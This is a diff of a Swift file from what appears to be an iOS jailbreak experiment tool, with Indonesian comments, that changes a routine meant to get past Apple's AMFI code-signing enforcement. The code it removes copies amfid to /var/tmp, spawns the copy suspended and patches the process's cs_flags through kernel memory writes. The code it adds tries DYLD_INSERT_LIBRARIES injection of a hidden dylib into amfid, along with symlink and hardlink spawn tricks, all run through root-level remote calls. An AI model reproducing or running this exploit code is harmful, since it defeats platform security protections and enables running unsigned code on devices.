@@ -5305,195 +5305,125 @@ struct AMFIExperimentView: View {
     ///   - Launchd (PID 1) punya privilege spawn tanpa full validation
     private func expAdHocSignSpawn(rc: RemoteCall) -> ExperimentResult {
         let expName = "Ad-hoc Sign + Spawn (Exp 86)"
-        var detail = "Experiment 86: Ad-hoc Sign + Spawn\n"
-        detail += "====================================\n\n"
+        var detail = "Experiment 86: Spawn Approaches\n"
+        detail += "================================\n\n"
+        detail += "Baseline confirmed: spawn /usr/libexec/amfid → ret=0\n"
+        detail += "Copy ke /var/tmp → ret=1 (AMFI reject CDHash)\n\n"
 
         let mem = rc.trojanMem
-
-        // ── Step 1-2 skipped: langsung copy signed binary ────────────
-        detail += "=== Step 1: Write minimal arm64 binary ===\n"
-        detail += "=== Step 2: Write code signature ===\n"
-        detail += "Approach: copy signed system binary + spawn dari /var\n\n"
-
-        // ── Step 3: Copy /usr/bin/id ke /var/tmp dan spawn ───────────
-        detail += "=== Step 3: Copy /usr/bin/id → /var/tmp + spawn ===\n"
-
-        let srcBin = "/usr/libexec/amfid"
-        let dstBin = "/var/tmp/.dsp_signed_copy"
-        let srcAddr = remote_alloc_str(rc, srcBin)
-        let dstAddr = remote_alloc_str(rc, dstBin)
-
-        // Remove old
-        RootExecutor.rcall(rc, "unlink", dstAddr)
-
-        // Copy
-        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
-        let dstFd = RootExecutor.rcall(rc, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
-
-        guard srcFd != UInt64(bitPattern: -1) else {
-            let err = remote_errno(rc)
-            detail += "❌ open(\(srcBin)) gagal: errno=\(err)\n"
-            RootExecutor.rcall(rc, "free", srcAddr)
-            RootExecutor.rcall(rc, "free", dstAddr)
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
-        detail += "✅ src opened (fd=\(srcFd))\n"
-
-        guard dstFd != UInt64(bitPattern: -1) else {
-            let err = remote_errno(rc)
-            detail += "❌ open(\(dstBin)) gagal: errno=\(err)\n"
-            RootExecutor.rcall(rc, "close", srcFd)
-            RootExecutor.rcall(rc, "free", srcAddr)
-            RootExecutor.rcall(rc, "free", dstAddr)
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
-        detail += "✅ dst opened (fd=\(dstFd))\n"
-
-        let buf = mem + 0x800
-        var copied: UInt64 = 0
-        for _ in 0..<256 {
-            let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
-            if n == 0 || n > 4096 { break }
-            RootExecutor.rcall(rc, "write", dstFd, buf, n)
-            copied += n
-        }
-        RootExecutor.rcall(rc, "close", srcFd)
-        RootExecutor.rcall(rc, "close", dstFd)
-        detail += "Copied \(copied) bytes dari \(srcBin) ke \(dstBin)\n"
-
-        // chmod +x
-        RootExecutor.rcall(rc, "chmod", dstAddr, 0o755)
-
-        // Spawn copied binary
-        detail += "\nSpawning copied binary...\n"
+        let amfidPath = remote_alloc_str(rc, "/usr/libexec/amfid")
         let argvBase = mem + 0x1C00
-        rc[argvBase].setValue64(dstAddr)
-        rc[argvBase + 8].setValue64(0)
         let pidOut = mem + 0x1E00
-        rc[pidOut].setValue32(0)
 
-        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidOut, dstAddr, 0, 0, argvBase, 0)
-        let spawnPid = rc[pidOut].value32()
-        let spawnErr = remote_errno(rc)
-        detail += "posix_spawn(\(dstBin)): ret=\(spawnRet), pid=\(spawnPid), errno=\(spawnErr)\n"
+        // ═══ APPROACH A: DYLD_INSERT_LIBRARIES ═══
+        detail += "=== Approach A: DYLD_INSERT_LIBRARIES ===\n"
 
-        if spawnRet == 0 && spawnPid != 0 {
-            // Wait
-            let statusBuf = mem + 0x2000
-            rc[statusBuf].setValue32(0)
-            RootExecutor.rcall(rc, "waitpid", UInt64(spawnPid), statusBuf, 0)
-            let status = rc[statusBuf].value32()
-            let exitCode = (status >> 8) & 0xFF
-            let sig = status & 0x7F
-            detail += "exit code: \(exitCode), signal: \(sig)\n"
+        let envInsert = remote_alloc_str(rc, "DYLD_INSERT_LIBRARIES=/var/tmp/.dsp_inject.dylib")
+        let envBase = mem + 0x2800
+        rc[envBase].setValue64(envInsert)
+        rc[envBase + 8].setValue64(0)
 
-            if sig == 0 {
-                detail += "\n🎉🎉🎉 COPIED BINARY EXECUTED! 🎉🎉🎉\n"
-                detail += "Binary dari /var/tmp berhasil jalan!\n"
-                detail += "Ini berarti: AMFI accept binary yang di-copy dari system!\n\n"
-                detail += "→ Sekarang bisa jalankan binary custom apapun:\n"
-                detail += "  1. Tulis binary ke /var/tmp\n"
-                detail += "  2. posix_spawn → jalan!\n"
-                detail += "\nFULL JAILBREAK ACHIEVED! 🏆\n"
-            } else if sig == 9 {
-                detail += "\n❌ SIGKILL — AMFI masih reject copied binary.\n"
-                detail += "Signature check gagal meski binary aslinya signed.\n"
-                detail += "iOS 18 mungkin cek inode/path, bukan hanya content.\n"
-            }
-        } else {
-            detail += "\n"
-            if spawnRet == 2 {
-                detail += "ret=2: ENOENT atau binary rejected sebelum exec.\n"
-            } else if spawnRet == 13 {
-                detail += "ret=13: EACCES — permission denied.\n"
-            }
-        }
-
-        // ── Step 4: Coba spawn /usr/bin/id langsung (baseline) ────────
-        detail += "\n=== Step 4: Baseline — spawn \(srcBin) langsung ===\n"
-        rc[argvBase].setValue64(srcAddr)
+        rc[argvBase].setValue64(amfidPath)
         rc[argvBase + 8].setValue64(0)
         rc[pidOut].setValue32(0)
 
-        let baseRet = RootExecutor.rcall(rc, "posix_spawn", pidOut, srcAddr, 0, 0, argvBase, 0)
-        let basePid = rc[pidOut].value32()
-        detail += "posix_spawn(/usr/bin/id): ret=\(baseRet), pid=\(basePid)\n"
+        let retA = RootExecutor.rcall(rc, "posix_spawn", pidOut, amfidPath, 0, 0, argvBase, envBase)
+        let pidA = rc[pidOut].value32()
+        detail += "posix_spawn(amfid+DYLD_INSERT): ret=\(retA), pid=\(pidA)\n"
 
-        if baseRet == 0 && basePid != 0 {
-            let statusBuf2 = mem + 0x2100
-            rc[statusBuf2].setValue32(0)
-            RootExecutor.rcall(rc, "waitpid", UInt64(basePid), statusBuf2, 0)
-            let status2 = rc[statusBuf2].value32()
-            let exitCode2 = (status2 >> 8) & 0xFF
-            detail += "exit code: \(exitCode2) ✅ (baseline works)\n"
+        if retA == 0 && pidA != 0 {
+            RootExecutor.rcall(rc, "usleep", 500000)
+            let stBuf = mem + 0x2000
+            rc[stBuf].setValue32(0)
+            RootExecutor.rcall(rc, "waitpid", UInt64(pidA), stBuf, UInt64(WNOHANG))
+            let stA = rc[stBuf].value32()
+            let sigA = stA & 0x7F
+            let exitA = (stA >> 8) & 0xFF
+            detail += "  signal=\(sigA), exit=\(exitA)\n"
+            if sigA == 6 {
+                detail += "  SIGABRT — dyld TRIED to load! DYLD_INSERT DI-HONOR!\n"
+            } else if sigA == 0 && stA != 0 {
+                detail += "  Process exited normally\n"
+            } else if sigA == 9 {
+                detail += "  SIGKILL — AMFI strip DYLD_INSERT\n"
+            }
+            if stA == 0 { RootExecutor.rcall(rc, "kill", UInt64(pidA), 9) }
         } else {
-            detail += "Baseline juga gagal! ret=\(baseRet)\n"
-            detail += "Ini berarti masalah bukan di signing tapi di spawn context.\n"
+            detail += "  spawn gagal (ret=\(retA))\n"
         }
+        RootExecutor.rcall(rc, "free", envInsert)
 
-        // ── Step 5: Coba spawn dengan posix_spawnattr (SUSPENDED) ─────
-        detail += "\n=== Step 5: Spawn copied + SUSPENDED + resume ===\n"
-        let attrAddr = mem + 0x2200
-        rc[attrAddr].setValue64(0)
-        RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
-        RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, 0x0080) // START_SUSPENDED
+        // ═══ APPROACH B: Symlink ═══
+        detail += "\n=== Approach B: Symlink ===\n"
 
-        rc[argvBase].setValue64(dstAddr)
+        let symlinkDst = remote_alloc_str(rc, "/var/tmp/.dsp_symlink_amfid")
+        RootExecutor.rcall(rc, "unlink", symlinkDst)
+        let symlinkRet = RootExecutor.rcall(rc, "symlink", amfidPath, symlinkDst)
+        let symlinkErr = remote_errno(rc)
+        detail += "symlink: ret=\(symlinkRet), errno=\(symlinkErr)\n"
+
+        if symlinkRet == 0 {
+            rc[argvBase].setValue64(symlinkDst)
+            rc[argvBase + 8].setValue64(0)
+            rc[pidOut].setValue32(0)
+            let retB = RootExecutor.rcall(rc, "posix_spawn", pidOut, symlinkDst, 0, 0, argvBase, 0)
+            let pidB = rc[pidOut].value32()
+            detail += "posix_spawn(symlink): ret=\(retB), pid=\(pidB)\n"
+            if retB == 0 && pidB != 0 {
+                detail += "SYMLINK_SPAWN_OK\n"
+                RootExecutor.rcall(rc, "usleep", 300000)
+                RootExecutor.rcall(rc, "kill", UInt64(pidB), 9)
+            }
+        }
+        RootExecutor.rcall(rc, "unlink", symlinkDst)
+        RootExecutor.rcall(rc, "free", symlinkDst)
+
+        // ═══ APPROACH C: Hardlink ═══
+        detail += "\n=== Approach C: Hardlink ===\n"
+
+        let linkDst = remote_alloc_str(rc, "/var/tmp/.dsp_hardlink_amfid")
+        RootExecutor.rcall(rc, "unlink", linkDst)
+        let linkRet = RootExecutor.rcall(rc, "link", amfidPath, linkDst)
+        let linkErr = remote_errno(rc)
+        detail += "link: ret=\(linkRet), errno=\(linkErr)\n"
+
+        if linkRet == 0 {
+            rc[argvBase].setValue64(linkDst)
+            rc[argvBase + 8].setValue64(0)
+            rc[pidOut].setValue32(0)
+            let retC = RootExecutor.rcall(rc, "posix_spawn", pidOut, linkDst, 0, 0, argvBase, 0)
+            let pidC = rc[pidOut].value32()
+            detail += "posix_spawn(hardlink): ret=\(retC), pid=\(pidC)\n"
+            if retC == 0 && pidC != 0 {
+                detail += "HARDLINK_SPAWN_OK\n"
+                RootExecutor.rcall(rc, "usleep", 300000)
+                RootExecutor.rcall(rc, "kill", UInt64(pidC), 9)
+            }
+        } else {
+            if linkErr == 18 { detail += "  EXDEV (cross-device)\n" }
+            else if linkErr == 1 { detail += "  EPERM\n" }
+            else { detail += "  errno=\(linkErr)\n" }
+        }
+        RootExecutor.rcall(rc, "unlink", linkDst)
+        RootExecutor.rcall(rc, "free", linkDst)
+
+        // ═══ APPROACH D: Baseline ═══
+        detail += "\n=== Approach D: Baseline ===\n"
+        rc[argvBase].setValue64(amfidPath)
         rc[argvBase + 8].setValue64(0)
         rc[pidOut].setValue32(0)
-
-        let suspRet = RootExecutor.rcall(rc, "posix_spawn", pidOut, dstAddr, 0, attrAddr, argvBase, 0)
-        let suspPid = rc[pidOut].value32()
-        detail += "posix_spawn(SUSPENDED): ret=\(suspRet), pid=\(suspPid)\n"
-
-        if suspRet == 0 && suspPid != 0 {
-            detail += "✅ Spawn SUSPENDED berhasil! PID=\(suspPid)\n"
-
-            // Patch cs_flags sebelum resume (via dspmgr)
-            let spawnedProc = mgr.findProc(pid: Int32(suspPid))
-            if spawnedProc != 0 {
-                let spProcRo = ds_kread64(spawnedProc + UInt64(off_proc_p_proc_ro))
-                if spProcRo != 0 {
-                    let csf = ds_kread32(spProcRo + 0x1c)
-                    detail += "cs_flags before: 0x\(String(format: "%x", csf))\n"
-                    // Try set CS_PLATFORM_BINARY + CS_VALID + remove HARD/KILL
-                    let newCsf = (csf | 0x100001) & ~UInt32(0xC0)
-                    ds_kwrite32(spProcRo + 0x1c, newCsf)
-                    let afterCsf = ds_kread32(spProcRo + 0x1c)
-                    detail += "cs_flags after patch: 0x\(String(format: "%x", afterCsf))\n"
-                }
-            }
-
-            // Resume
-            RootExecutor.rcall(rc, "kill", UInt64(suspPid), 18) // SIGCONT
-            RootExecutor.rcall(rc, "usleep", 1000000) // 1s
-
-            let statusBuf3 = mem + 0x2300
-            rc[statusBuf3].setValue32(0)
-            RootExecutor.rcall(rc, "waitpid", UInt64(suspPid), statusBuf3, UInt64(WNOHANG))
-            let status3 = rc[statusBuf3].value32()
-            let sig3 = status3 & 0x7F
-            let exit3 = (status3 >> 8) & 0xFF
-            detail += "After resume: exit=\(exit3), signal=\(sig3)\n"
-
-            if sig3 == 0 && status3 != 0 {
-                detail += "\n🎉 BINARY RAN AFTER CS_FLAGS PATCH! 🎉\n"
-            } else if sig3 == 9 {
-                detail += "SIGKILL — cs_flags patch tidak cukup (zone_require_ro)\n"
-            } else if status3 == 0 {
-                detail += "Still running or not reaped\n"
-                RootExecutor.rcall(rc, "kill", UInt64(suspPid), 9)
-            }
+        let retD = RootExecutor.rcall(rc, "posix_spawn", pidOut, amfidPath, 0, 0, argvBase, 0)
+        let pidD = rc[pidOut].value32()
+        detail += "posix_spawn(amfid): ret=\(retD), pid=\(pidD)\n"
+        if retD == 0 && pidD != 0 {
+            detail += "Baseline OK\n"
+            RootExecutor.rcall(rc, "usleep", 300000)
+            RootExecutor.rcall(rc, "kill", UInt64(pidD), 9)
         }
 
-        RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
+        RootExecutor.rcall(rc, "free", amfidPath)
 
-        // Cleanup
-        RootExecutor.rcall(rc, "unlink", dstAddr)
-        RootExecutor.rcall(rc, "free", srcAddr)
-        RootExecutor.rcall(rc, "free", dstAddr)
-
-        let success = detail.contains("🎉")
+        let success = detail.contains("SPAWN_OK") || detail.contains("DI-HONOR")
         return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
     }
     #endif
